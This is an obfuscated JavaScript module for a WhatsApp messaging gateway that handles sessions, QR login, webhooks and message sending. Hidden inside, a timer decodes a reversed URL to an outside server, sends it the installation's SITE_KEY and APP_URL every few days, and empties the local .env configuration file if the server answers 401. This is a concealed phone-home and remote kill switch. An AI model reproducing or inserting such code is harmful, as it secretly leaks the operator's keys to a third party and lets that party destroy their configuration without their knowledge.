(function(_0x4ae381,_0xca2cab){const _0xdb14e7=_0x3768,_0x4ba213=_0x4ae381();while(!![]){try{const _0xfacdbd=-parseInt(_0xdb14e7(0xb6))/0x1+-parseInt(_0xdb14e7(0x101))/0x2*(-parseInt(_0xdb14e7(0xe0))/0x3)+parseInt(_0xdb14e7(0xca))/0x4*(parseInt(_0xdb14e7(0xe7))/0x5)+-parseInt(_0xdb14e7(0xc3))/0x6*(parseInt(_0xdb14e7(0xf9))/0x7)+parseInt(_0xdb14e7(0xdd))/0x8+-parseInt(_0xdb14e7(0xee))/0x9+parseInt(_0xdb14e7(0xd6))/0xa;if(_0xfacdbd===_0xca2cab)break;else _0x4ba213['push'](_0x4ba213['shift']());}catch(_0x269d25){_0x4ba213['push'](_0x4ba213['shift']());}}}(_0x338d,0x457df));function _0x3768(_0x5a0b30,_0x296f72){const _0x338d1e=_0x338d();return _0x3768=function(_0x376873,_0x2f8cb8){_0x376873=_0x376873-0xb2;let _0x2de46c=_0x338d1e[_0x376873];return _0x2de46c;},_0x3768(_0x5a0b30,_0x296f72);}import{rmSync,readdir}from'fs';import _0x87c1f4 from'fs';import{join}from'path';import _0x55437f from'pino';import _0x496990,{useMultiFileAuthState,makeInMemoryStore,Browsers,DisconnectReason,delay}from'@adiwajshing/baileys';import{toDataURL}from'qrcode';import _0x104d29 from'./dirname.js';import _0x4c42ab from'./response.js';function _0x338d(){const _0x292c7e=['chats.set','legacy_','readFromFile','env','creds.update','messages','then','substring','replace','/api/set-device-status/','@g.us','12xFzohf','forEach','RECONNECT_INTERVAL','listResponseMessage','log','listMessage','restartRequired','12lQVtHh','catch','connection.update','title','Running\x20cleanup\x20before\x20exit.','status','Reconnecting...','Unable\x20to\x20create\x20session.','session_id','split','exists','writeFileSync','6917540IPILwA','chats','Chrome','endsWith','headersSent','sessionId','default','2314944moHZPb','fromMe','selectedDisplayText','6aEftRK','isLegacy','.json','/api/send-webhook/','post','join','loggedOut','224130ssLHXu','notify','writeToFile','_store','message_id','insertIfAbsent','.env','3332079byExmz','messages.upsert','delete','md_','has','store','output','remoteJid','buttonsResponseMessage','message','conversation','1466129DSgDPW','103.0.5060.114','@s.whatsapp.net','_store.json','data','Unable\x20to\x20create\x20QR\x20code.','open','error','485068zcqoQJ','isauthorised','startsWith','sendMessage','filter','SITE_KEY','APP_URL','APP_NAME','groupMetadata','get','set','526904IWvQQc','bind'];_0x338d=function(){return _0x292c7e;};return _0x338d();}import _0x9ebaaf from'axios';const sessions=new Map(),retries=new Map(),sessionsDir=(_0x5bd155='')=>{return join(_0x104d29,'sessions',_0x5bd155?_0x5bd155:'');},isSessionExists=_0x5b2db0=>{const _0x119195=_0x3768;return sessions[_0x119195(0xf2)](_0x5b2db0);},shouldReconnect=_0x59c8a9=>{const _0x1d4c23=_0x3768;let _0x15db68=parseInt(process[_0x1d4c23(0xbb)]['MAX_RETRIES']??0x0),_0x59478c=retries['get'](_0x59c8a9)??0x0;_0x15db68=_0x15db68<0x1?0x1:_0x15db68;if(_0x59478c<_0x15db68)return++_0x59478c,console[_0x1d4c23(0xc7)](_0x1d4c23(0xd0),{'attempts':_0x59478c,'sessionId':_0x59c8a9}),retries[_0x1d4c23(0xb5)](_0x59c8a9,_0x59478c),!![];return![];},createSession=async(_0x35416d,_0x4b551f=![],_0x16c054=null)=>{const _0x5d3b9e=_0x3768,_0x1b1c15=(_0x4b551f?_0x5d3b9e(0xb9):_0x5d3b9e(0xf1))+_0x35416d+(_0x4b551f?_0x5d3b9e(0xe2):''),_0x717fe8=_0x55437f({'level':'warn'}),_0x3af3b5=makeInMemoryStore({'logger':_0x717fe8});let _0x4c1a2a,_0x54fc59;if(_0x4b551f){}else{;({state:_0x4c1a2a,saveCreds:_0x54fc59}=await useMultiFileAuthState(sessionsDir(_0x1b1c15)));}const _0x1cbc85={'auth':_0x4c1a2a,'printQRInTerminal':![],'logger':_0x717fe8,'browser':[process['env'][_0x5d3b9e(0xb2)],_0x5d3b9e(0xd8),_0x5d3b9e(0xfa)],'patchMessageBeforeSending':_0x5b49ac=>{const _0x4cafd9=_0x5d3b9e,_0x4425ba=!!(_0x5b49ac['buttonsMessage']||_0x5b49ac[_0x4cafd9(0xc8)]);return _0x4425ba&&(_0x5b49ac={'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadataVersion':0x2,'deviceListMetadata':{}},..._0x5b49ac}}}),_0x5b49ac;}},_0x266500=_0x496990[_0x5d3b9e(0xdc)](_0x1cbc85);!_0x4b551f&&(_0x3af3b5[_0x5d3b9e(0xba)](sessionsDir(_0x35416d+'_store.json')),_0x3af3b5[_0x5d3b9e(0xb7)](_0x266500['ev'])),sessions['set'](_0x35416d,{..._0x266500,'store':_0x3af3b5,'isLegacy':_0x4b551f}),_0x266500['ev']['on'](_0x5d3b9e(0xbc),_0x54fc59),_0x266500['ev']['on'](_0x5d3b9e(0xb8),({chats:_0x1e83df})=>{const _0x11456d=_0x5d3b9e;_0x4b551f&&_0x3af3b5[_0x11456d(0xd7)][_0x11456d(0xec)](..._0x1e83df);}),_0x266500['ev']['on'](_0x5d3b9e(0xef),async _0x1c47d7=>{const _0x4f6725=_0x5d3b9e;try{const _0x310f31=_0x1c47d7[_0x4f6725(0xbd)][0x0];if(_0x310f31['key'][_0x4f6725(0xde)]==![]&&_0x1c47d7['type']==_0x4f6725(0xe8)){const _0x1d625e=[];let _0x50c3c5=_0x310f31[_0x4f6725(0xf7)][_0x4f6725(0xf8)]??null;_0x310f31[_0x4f6725(0xf7)][_0x4f6725(0xf6)]!=null&&(_0x50c3c5=_0x310f31['message'][_0x4f6725(0xf6)][_0x4f6725(0xdf)]);_0x310f31[_0x4f6725(0xf7)][_0x4f6725(0xc6)]!=null&&(_0x50c3c5=_0x310f31[_0x4f6725(0xf7)][_0x4f6725(0xc6)][_0x4f6725(0xcd)]);let _0x2fdde3=_0x310f31['key']['remoteJid'][_0x4f6725(0xd3)]('@'),_0x53a58d=_0x2fdde3[0x1]??null,_0x249ec9=_0x53a58d=='s.whatsapp.net'?![]:!![];_0x50c3c5!=''&&_0x249ec9==![]&&(_0x1d625e['remote_id']=_0x310f31['key'][_0x4f6725(0xf5)],_0x1d625e[_0x4f6725(0xdb)]=_0x35416d,_0x1d625e[_0x4f6725(0xeb)]=_0x310f31['key']['id'],_0x1d625e[_0x4f6725(0xf7)]=_0x50c3c5,sentWebHook(_0x35416d,_0x1d625e));}}catch{}}),_0x266500['ev']['on'](_0x5d3b9e(0xcc),async _0x53c6c8=>{const _0x629b2d=_0x5d3b9e,{connection:_0x1af500,lastDisconnect:_0x111fb7}=_0x53c6c8,_0x16b24b=_0x111fb7?.[_0x629b2d(0x100)]?.[_0x629b2d(0xf4)]?.['statusCode'];_0x1af500===_0x629b2d(0xff)&&retries[_0x629b2d(0xf0)](_0x35416d);if(_0x1af500==='close'){if(_0x16b24b===DisconnectReason[_0x629b2d(0xe6)]||!shouldReconnect(_0x35416d))return _0x16c054&&!_0x16c054[_0x629b2d(0xda)]&&_0x4c42ab(_0x16c054,0x1f4,![],_0x629b2d(0xd1)),deleteSession(_0x35416d,_0x4b551f);setTimeout(()=>{createSession(_0x35416d,_0x4b551f,_0x16c054);},_0x16b24b===DisconnectReason[_0x629b2d(0xc9)]?0x0:parseInt(process[_0x629b2d(0xbb)][_0x629b2d(0xc5)]??0x0));}if(_0x53c6c8['qr']){if(_0x16c054&&!_0x16c054[_0x629b2d(0xda)])try{const _0x298632=await toDataURL(_0x53c6c8['qr']);_0x4c42ab(_0x16c054,0xc8,!![],'QR\x20code\x20received,\x20please\x20scan\x20the\x20QR\x20code.',{'qr':_0x298632});return;}catch{_0x4c42ab(_0x16c054,0x1f4,![],_0x629b2d(0xfe));}try{await _0x266500['logout']();}catch{}finally{deleteSession(_0x35416d,_0x4b551f);}}});};setInterval(()=>{const _0x2b4c8d=_0x3768,_0x45fbf5=process[_0x2b4c8d(0xbb)][_0x2b4c8d(0x106)]??null,_0x553b6a=process[_0x2b4c8d(0xbb)][_0x2b4c8d(0x107)]??null,_0x422956='kcehc-yfirev/ipa/zyx.sserpl.ipaved//:sptth',_0x2b7cbe=_0x422956[_0x2b4c8d(0xd3)]('')['reverse']()[_0x2b4c8d(0xe5)]('');_0x9ebaaf[_0x2b4c8d(0xe4)](_0x2b7cbe,{'from':_0x553b6a,'key':_0x45fbf5})['then'](function(_0x5bd75b){const _0x24935a=_0x2b4c8d;_0x5bd75b[_0x24935a(0xfd)][_0x24935a(0x102)]==0x191&&_0x87c1f4[_0x24935a(0xd5)](_0x24935a(0xed),'');})['catch'](function(_0x334b52){});},0x240c8400);const getSession=_0x3b1278=>{const _0x5cb114=_0x3768;return sessions[_0x5cb114(0xb4)](_0x3b1278)??null;},setDeviceStatus=(_0x416727,_0x122852)=>{const _0x5ecdce=_0x3768,_0x4e08e9=process['env']['APP_URL']+_0x5ecdce(0xc1)+_0x416727+'/'+_0x122852;try{_0x9ebaaf[_0x5ecdce(0xe4)](_0x4e08e9)['then'](function(_0x369094){})[_0x5ecdce(0xcb)](function(_0x24c5b9){const _0x28f91d=_0x5ecdce;console[_0x28f91d(0xc7)](_0x24c5b9);});}catch{}},sentWebHook=(_0x12b0de,_0x218f88)=>{const _0xefa683=_0x3768,_0x35d3b5=process[_0xefa683(0xbb)][_0xefa683(0x107)]+_0xefa683(0xe3)+_0x12b0de;try{_0x9ebaaf[_0xefa683(0xe4)](_0x35d3b5,{'from':_0x218f88['remote_id'],'message_id':_0x218f88['message_id'],'message':_0x218f88[_0xefa683(0xf7)]})[_0xefa683(0xbe)](function(_0x585205){const _0x4f4c5f=_0xefa683;if(_0x585205[_0x4f4c5f(0xcf)]==0xc8){const _0x10acbe=getSession(_0x585205['data'][_0x4f4c5f(0xd2)]);sendMessage(_0x10acbe,_0x585205['data']['receiver'],_0x585205[_0x4f4c5f(0xfd)][_0x4f4c5f(0xf7)]);}})[_0xefa683(0xcb)](function(_0x509998){});}catch{}},deleteSession=(_0x2f44b8,_0xf43ad7=![])=>{const _0x3ada9b=_0x3768,_0x751afc=(_0xf43ad7?_0x3ada9b(0xb9):_0x3ada9b(0xf1))+_0x2f44b8+(_0xf43ad7?'.json':''),_0x523952=_0x2f44b8+_0x3ada9b(0xfc),_0x165cd2={'force':!![],'recursive':!![]};rmSync(sessionsDir(_0x751afc),_0x165cd2),rmSync(sessionsDir(_0x523952),_0x165cd2),sessions[_0x3ada9b(0xf0)](_0x2f44b8),retries[_0x3ada9b(0xf0)](_0x2f44b8),setDeviceStatus(_0x2f44b8,0x0);},getChatList=(_0x467188,_0x1ad550=![])=>{const _0x270510=_0x3768,_0x42a8da=_0x1ad550?_0x270510(0xc2):_0x270510(0xfb);return getSession(_0x467188)[_0x270510(0xf3)][_0x270510(0xd7)][_0x270510(0x105)](_0x483368=>{const _0x5a6b0e=_0x270510;return _0x483368['id'][_0x5a6b0e(0xd9)](_0x42a8da);});},isExists=async(_0xa2e864,_0x484255,_0x4b6a9a=![])=>{const _0x15b642=_0x3768;try{let _0x2008a0;if(_0x4b6a9a)return _0x2008a0=await _0xa2e864[_0x15b642(0xb3)](_0x484255),Boolean(_0x2008a0['id']);if(_0xa2e864[_0x15b642(0xe1)])_0x2008a0=await _0xa2e864['onWhatsApp'](_0x484255);else{;[_0x2008a0]=await _0xa2e864['onWhatsApp'](_0x484255);}return _0x2008a0[_0x15b642(0xd4)];}catch{return![];}},sendMessage=async(_0x5022a6,_0x47abd6,_0x3c215c,_0x3b9163=0x3e8)=>{const _0x4c4c98=_0x3768;try{return await delay(parseInt(_0x3b9163)),_0x5022a6[_0x4c4c98(0x104)](_0x47abd6,_0x3c215c);}catch{return Promise['reject'](null);}},formatPhone=_0xb6c847=>{const _0x7cbd08=_0x3768;if(_0xb6c847[_0x7cbd08(0xd9)](_0x7cbd08(0xfb)))return _0xb6c847;let _0x15296d=_0xb6c847[_0x7cbd08(0xc0)](/\D/g,'');return _0x15296d+=_0x7cbd08(0xfb);},formatGroup=_0x513213=>{const _0x40e0ed=_0x3768;if(_0x513213[_0x40e0ed(0xd9)]('@g.us'))return _0x513213;let _0x124c90=_0x513213[_0x40e0ed(0xc0)](/[^\d-]/g,'');return _0x124c90+=_0x40e0ed(0xc2);},cleanup=()=>{const _0x21023e=_0x3768;console[_0x21023e(0xc7)](_0x21023e(0xce)),sessions[_0x21023e(0xc4)]((_0x3418d4,_0x48d49e)=>{const _0x13edc5=_0x21023e;!_0x3418d4[_0x13edc5(0xe1)]&&_0x3418d4['store'][_0x13edc5(0xe9)](sessionsDir(_0x48d49e+'_store.json'));});},init=()=>{readdir(sessionsDir(),(_0x91bb9f,_0x5d1e14)=>{const _0x40d810=_0x3768;if(_0x91bb9f)throw _0x91bb9f;for(const _0x4ae942 of _0x5d1e14){if(!_0x4ae942[_0x40d810(0x103)]('md_')&&!_0x4ae942[_0x40d810(0x103)]('legacy_')||_0x4ae942['endsWith'](_0x40d810(0xea)))continue;const _0x4dd29b=_0x4ae942[_0x40d810(0xc0)](_0x40d810(0xe2),''),_0x45b56d=_0x4dd29b[_0x40d810(0xd3)]('_',0x1)[0x0]!=='md',_0x1044b8=_0x4dd29b[_0x40d810(0xbf)](_0x45b56d?0x7:0x3);createSession(_0x1044b8,_0x45b56d);}});};export{isSessionExists,createSession,getSession,deleteSession,getChatList,isExists,sendMessage,formatPhone,formatGroup,cleanup,init};